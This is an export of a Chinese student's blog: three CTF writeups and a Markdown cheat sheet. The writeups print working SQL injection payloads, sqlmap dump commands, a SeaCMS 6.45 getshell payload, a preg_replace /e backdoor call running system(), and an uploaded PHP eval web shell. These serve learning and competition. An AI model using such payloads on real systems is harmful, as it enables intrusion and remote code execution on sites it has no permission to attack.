[{"title":"嘉韦斯杯Writeup","date":"2019-04-01T15:38:32.000Z","path":"2019/04/01/嘉韦斯杯Writeup/","text":"壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本：123456789101112import requestsimport reurl = 'http://47.103.43.235:82/web/a/index.php'r = requests.session()res = r.get(url).textcont = re.findall('-?[0-9xABCDEF]\\d*[\\+\\-\\*\\%\\^/( )]*',res)cont = \"\".join(cont)resu = eval(cont[1:59])data = &#123;'result':resu&#125;ans = r.post(url,data = data)print(ans.text) 赛后专门琢磨了html内容提取，本体还可以用str.split(&quot;&lt;p&gt;&quot;)和str.split(&quot;&lt;/p&gt;&quot;)进行截取，截取方式不唯一，自己喜欢的才是最好的┓( ´-` )┏ 肆打开链接是一张二维码图片，保存到本地，用binwalk分离出其中的压缩包压缩包中有一个key.txt文件，flag应该就在里面了，解压发现需要密码，首先尝试伪加密破解，无果，应该是实打实的加密了，开始爆破密码，爆出密码：674290437，查看key.txt获得flag 伍神奇的密码1 又是一长串的字符，看出是base64，进行解密，又是一层base64，其中解出的base64编码的=都是%3D表示的。要将这部分url编码换成=再进行解码。最后解出得到fB__l621a4h4g_ai%7B%26i%7D将其中的url编码解码得到fB__l621a4h4g_ai{&amp;i}可以看到这像是一段打乱顺序的flag，试试栅栏密码、凯撒密码和列移位密码最终在栅栏密码5字一组的时候试出flag{B64_&amp;_2hai_14i} 陆神奇的密码2 题目给了一串字符：bg[`sZ*Zg’dPfP`VM_SXVd密码学的题，没多大头绪，规律是学长找出来的脚本：12345678str='bg[`sZ*Zg\\'dPfP`VM_SXVd'strlen=len(str)i=3flag=''for c in str: i=i+1 flag=flag+chr(ord(c)+i)print(flag) 柒又是一道SQL注入题，这题鼓捣了好久！ 经过测试发现id=后面是以base64加密逆序输入的，过滤了or、=、”、&#39;、union、select，并且不需要闭合引号 爆库：0//uunionnion//selselectect/**/1,2,3,4,5,database()#=MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 爆表：0//uunionnion//selselectect//1,2,3,4,5,table_name//from//infoorrmation_schema.tables//where//table_schema//like/**/database()#=owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 爆列：0//uunionnion//selselectect//1,2,3,4,5,column_name//from//infoorrmation_schema.columns//where//table_name//like/**/0x666C6167 #=MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 最后payload：0//uniunionon//seselectlect//1,2,3,4,5,flag//from/**/flag#jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM 捌上Kali的openssl，其中e就是exponent的值，转成十进制： 将解出的这串数字进行因式分解（http://factordb.com） 最后用python脚本进行解密：1234567891011#coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333q = 280385007186315115828483000867559983517n = 76775333340223961139427050707840417811156978085146970312315886671546666259161e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(\"fllllllag.txt\" , \"rb\") as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 玖seacms 这道题是直接利用海洋CMS 6.45版本前台getshell漏洞的payload打下来的Payload： searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(‘cat ../../flag.txt’); 拾查看源代码获得提示index.phps，得到主页源代码1234567891011&lt;?phperror_reporting(0);$flag = '********';if (isset($_POST['name']) and isset($_POST['password']))&#123; if ($_POST['name'] == $_POST['password']) print 'name and password must be diffirent'; else if (sha1($_POST['name']) === sha1($_POST['password'])) die($flag); else print 'invalid password';&#125;?&gt; 题目的关键点是name和password传入的内容要不同并且name和password的sha1值类型和内容都相同。那么就是主要考虑sha1对比的绕过。sha1函数要求传入的参数是字符串类型，那传入两个比如数组类型，结果就都是false,这样就会输出flag了 拾壹查看网页源代码 这道题上来首先就将我们传入的param1和param2类型转化为string，所以是不能通过数组绕过了。直接在网上搜了这样的两个值post上去： 后记这次比赛一共15道题，有四道没做出来，两道脑洞题，两道逆向（逆向真不是谁都能玩的啊！）。其中有一道希尔密码的题花的时间最多（关于希尔密码的加密解密有兴趣的同学可以自行百度，这里不再赘述），脚本是历经千辛万苦找到了，但最后flag还是不对……于是我去问了主办方，主办方说是这题有脑洞！！！行吧！希尔密码解密脚本：1234567891011121314151617181920212223242526272829303132333435Ma=[ 1,4,7, 2,5,8, 3,6,10 ]code=[ 23,10,12, 24,16,2, 25,3,9, 0,9,5 ]answer=[]flag = 0for t in range(0,12,3): flag = 0 for i in range(0,99,1): for j in range(0,99,1): for k in range(0,99,1): if ((1*i + 4*j + 7*k)%26 == code[t] and (2*i + 5*j + 8*k)%26 == code[t+1] and (3*i + 6*j + 10*k)%26 == code[t+2]): answer.append(i) answer.append(j) answer.append(k) flag = 1 break if(flag): break if(flag): break if(flag): continueprint (answer)for i in answer: print (chr(i + 97),end=\"\") 其中Ma是加密矩阵的逆矩阵，code是密文各字母对应的数字编码 比赛陆陆续续开始多起来了，好好加油吧！菜就是原罪！","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"嘉韦斯","slug":"嘉韦斯","permalink":"http://www.cryscat.com/tags/嘉韦斯/"},{"name":"华东师范大学","slug":"华东师范大学","permalink":"http://www.cryscat.com/tags/华东师范大学/"}]},{"title":"西北大学moeCTF-Web","date":"2019-03-10T12:10:14.000Z","path":"2019/03/10/西北大学moeCTF-Web/","text":"前言好久之前找到的一个CTF平台，今天偶然翻了出来，web部分还剩几道题，顺便刷掉吧…… 机器人很明显是robots协议 http://47.93.187.174/nwuctf/robots.txt 直接访问此文件得到flag nwuctf{robots_is_NOT_RobotQAQ} 让我们来弹一个flag根据题目意思，那就弹一个flag吧，在输入框输入&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;得到flag php弱类型查看源代码 12345678910&lt;/?php$s = $_GET['s'];$a = 'QNKCDZO';$md5a = md5($a);$md5s = md5($s);if($s != $a &amp;&amp; $md5a == $md5s)&#123; echo $flag;&#125;else&#123; echo 'try again';&#125; GET方式给s赋一个值，使s不等于a且s的md5值等于a的md5值,md5 collision payload: ?s=s878926199a An easy SQLi 2万能密码username:&#39;or 1=1，密码随便输，登进去getflag 头啊头哇首先赋值get=flag，然后会提示“必须使用IceRabbit浏览器”，改代理为IceRabbit Browser,接着会提示“你从google来吗？”，改Referrer为www.google.comgetflag 唯快不破?打开链接可以看到网页进行了多次跳转，利用python抓取页面就行了，将三个页面信息拼接得到flag php反序列化主页给了源码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);class hack&#123; public $mod1; public function __destruct() &#123; $this-&gt;mod1 = \"concat string\".$this-&gt;mod1; &#125;&#125;class str&#123; public $str1; public function __toString() &#123; $this-&gt;str1-&gt;flag(); return \"1\"; &#125;&#125;class get_flag&#123; public function flag() &#123; echo \"tql, 缁欏笀鍌呴€抐lag:\".\"nwuctf&#123;xxxxxxxxxxxxxxx&#125;\"; &#125;&#125;$a = $_GET['string'];unserialize($a);highlight_file(__FILE__);?&gt; 反推，flag可以通过str类的 toString魔术方法输出。该方法会在类被当做字符串的时候自动调用，所以自然而然想到利用hack类中的destruct payload代码 12345678910111213141516171819202122232425262728293031&lt;?phpclass hack&#123; public $mod1; public function __construct() &#123; $this-&gt;mod1 = new str; &#125;&#125;class str&#123; public $str1; public function __construct() &#123; $this-&gt;str1 = new get_flag; &#125;&#125;class get_flag&#123; public function flag() &#123; echo \"tql, 缁欏笀鍌呴€抐lag:\".\"nwuctf&#123;xxxxxxxxxxxxxxx&#125;\"; &#125;&#125;$a = new hack;$b = serialize($a);echo $b;?&gt; payload: string=O:4:%22hack%22:1:{s:4:%22mod1%22;O:3:%22str%22:1:{s:4:%22str1%22;O:8:%22get_flag%22:0:{}}} 如果还有如果题目给了源码 12345678910111213141516171819202122232425262728293031 &lt;?php$flag=\"nwuctf&#123;xxxxxxxxxxxxxxxxxxxx&#125;\";if (!empty($_SERVER['QUERY_STRING'])) &#123; $query = $_SERVER['QUERY_STRING']; $res = parse_str($query); if (!empty($res['action']))&#123; $action = $res['action']; &#125;&#125;if ($action === 'auth') &#123; if (!empty($res['user'])) &#123; $user = $res['user']; &#125; if (!empty($res['pass'])) &#123; $pass = $res['pass']; &#125; if (!empty($user) &amp;&amp; !empty($pass)) &#123; $hashed_password = hash('md5', $user.$pass); &#125; if (!empty($hashed_password) &amp;&amp; $hashed_password === '22180f07c8d8de04667257a18d9a64c6') &#123; echo $flag; &#125; else &#123; echo 'fail :('; &#125;&#125;else &#123; highlight_file(__FILE__);&#125; 利用parse_str函数覆盖变量hashed_password的值 payload: action=auth&amp;hashed_password=22180f07c8d8de04667257a18d9a64c6 An easy SQLi还是挺简单的，直接上sqlmap跑吧 sql注入漏洞sqlmap不是万能的╥﹏╥，只能靠自己手动注入了，简单测试了一下拦截了以下关键词order | left | mid | substr | like | = | %23(#)|ascii那就用right|regexp|--+进行注入吧~利用BP抓包并爆破?部分，突然发现MySQL不区分大小写？？？WTF！一路走来爆到不明大小写的库名、表名、列名、字段，很崩溃！因为过滤掉了ascii，在网上也没找到什么有用的相关资料，于是干脆直接去找西北大学的出题人聊了聊。他说这大小写并不是自己想要考察的点，只是自己没办法无奈之下的一个非预期效果……好吧 Orz。然后他甩给我一个链接。只要加入关键词binary就行了。 爆库 id=1’ and right(database(),1) regexp binary ‘§?§’ –+ 爆表 id=1’ and right((select group_concat(table_name) from information_schema.tables where table_schema regexp “ctf”),1) regexp binary ‘§?§’ –+ 爆列 id=1’ and right((select group_concat(column_name) from information_schema.columns where table_name regexp “fla49”),1) regexp ‘§?§’ –+ 爆段的最后一步 id=1’ and right((select group_concat(flag) from fla49),29) regexp binary ‘§?§wuctf{Her3_is_SQLi_FlaggQWQ}’ –+ flag : nwuctf{Her3_is_SQLi_FlaggQWQ} 被SQL玩的团团转。。。卒","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"moeCTF","slug":"moeCTF","permalink":"http://www.cryscat.com/tags/moeCTF/"},{"name":"Web","slug":"Web","permalink":"http://www.cryscat.com/tags/Web/"}]},{"title":"赛博地球杯网安大赛web部分Writeup","date":"2019-03-03T09:44:35.000Z","path":"2019/03/03/赛博地球杯网安大赛web部分Writeup/","text":"0X00 前言菜却坚强…… 0X01 大量设备报表不见了脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入爆破id试试id=2333时爆出flag 0X02 工控管理系统新版本大致浏览一下有login.php，regist.php，findpwd.php这三个页面在findpwd.php页面发现搜索框存在sql注入并且fuzz测试无任何过滤，直接上sqlmap吧，懒得动手了 爆数据库名：cetc004 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” –dbs 爆表名：user sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 –tables 爆列名：answer,password,question,username sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 -T user –columns 爆内容：没想多少干脆全爆出来，愣是跑了近一个小时，后悔了……其实只要将username爆出来就行了，密码是md5加密的，到处解没解出来 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 -T user -C “answer,password,question,username” –dump 后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号再登录进去就能getflag了 0X03 工控云管理系统设备维护中心被植入后门http://111.198.29.45:32548/index.php?page=index看到这url第一反应就是文件包含 http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 拿去base64解密关键部分代码： 123456789101112131415161718&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 代码审计可知要将XFF改为127.0.0.1才能触发后门。这是一个preg_replace()后门。/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。但要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含preg_replace() 的行中出现语法解析错误。payload: pat=/a/e&amp;rep=phpinfo()&amp;sub=a 之后可以通过system()等函数命令执行 pat=/a/e&amp;rep=system(“cat s3chahahaDir/flag/flag.php”)&amp;sub=a 查看源代码getflag 0X04 工控云管理系统项目管理页面解析漏洞题目给了源代码：123456789101112131415161718&lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql=\"select * from cetc007.user where id='$id'\"; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\"); if($result)&#123; echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True; &#125;?&gt; 在这一段代码中我们需要绕过if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;)使$_SESSION[&#39;admin&#39;] = True。此外还有一个隐藏的限制：mysql查询结果的限制，id大了查询不到。我们可以构造id=1\\09来绕过这部分限制。 第二部分代码： 123456789101112131415&lt;?php if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file; if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die(\"Bad file extension\"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; 这里的$filename = &quot;backup/&quot;.$file;目录为假目录需要绕过。 正则表达式if(preg_match(&#39;/.+\\.ph(p[3457]?|t|tml)$/i&#39;, $filename))对文件后缀进行过滤 真实的上传目录为uploaded我们可以通过$file加../绕过假目录。正则匹配只匹配最后一个点的后缀，可以通过../cryscat.php/1.php/..绕过。 payload(post) con=&lt;?php @eval($_POST[‘cryscat’]);?&gt;&amp;file=../cryscat.php/1.php/.. 之后用菜刀连接就行了，flag在html文件夹的flag.php文件中。","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"XCTF","slug":"XCTF","permalink":"http://www.cryscat.com/tags/XCTF/"}]},{"title":"Markdown语法","date":"2019-01-02T14:58:44.000Z","path":"2019/01/02/Markdown语法/","text":"快捷键撤销：Ctrl/Command + Z重做：Ctrl/Command + Y加粗：Ctrl/Command + B斜体：Ctrl/Command + I标题：Ctrl/Command + Shift + H无序列表：Ctrl/Command + Shift + U有序列表：Ctrl/Command + Shift + O检查列表：Ctrl/Command + Shift + C插入代码：Ctrl/Command + Shift + K插入链接：Ctrl/Command + Shift + L插入图片：Ctrl/Command + Shift + G 标题1级标题2级标题3级标题四级标题五级标题六级标题文本样式强调文本 强调文本 加粗文本 加粗文本 ==标记文本== 删除文本 引用文本 H~2~O is是液体。 2^10^ 运算结果是 1024。 列表 项目 项目 项目 项目1 项目2 项目3 计划任务 完成任务 链接链接: link. 图片: Alt 带尺寸的图片: =30x30 居中的图片: Alt 居中并且带尺寸的图片: =30x30 代码片下面展示一些 内联代码片。 12// A code blockvar foo = &apos;bar&apos;; 12// An highlighted blockvar foo = 'bar'; 表格 项目 Value 电脑 $1600 手机 $12 导管 $1 Column 1 Column 2 centered 文本居中 right-aligned 文本居右 自定义列表Markdown: Text-to-HTML conversion tool Authors: John: Luke 注脚一个具有注脚的文本。^1 注释Markdown将文本转换为 HTML。 *[HTML]: 超文本标记语言 LaTeX 数学公式Gamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\foralln\\in\\mathbb N$ 是通过 Euler integral $$\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt\\,.$$ 插入甘特图1234567gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section 现有任务 已完成 :done, des1, 2014-01-06,2014-01-08 进行中 :active, des2, 2014-01-09, 3d 计划中 : des3, after des2, 5d 插入UML图123456789sequenceDiagram张三 -&gt;&gt; 李四: 你好！李四, 最近怎么样?李四--&gt;&gt;王五: 你最近怎么样，王五？李四--x 张三: 我很好，谢谢!李四-x 王五: 我很好，谢谢!Note right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.李四--&gt;&gt;张三: 打量着王五...张三-&gt;&gt;王五: 很好... 王五, 你怎么样? 插入Mermaid流程图12345graph LRA[长方形] -- 链接 --&gt; B((圆))A --&gt; C(圆角长方形)B --&gt; D&#123;菱形&#125;C --&gt; D 插入Flowchart流程图123456789flowchatst=&gt;start: 开始e=&gt;end: 结束op=&gt;operation: 我的操作cond=&gt;condition: 确认？st-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op","tags":[{"name":"Markdown","slug":"Markdown","permalink":"http://www.cryscat.com/tags/Markdown/"},{"name":"Hexo","slug":"Hexo","permalink":"http://www.cryscat.com/tags/Hexo/"}]}]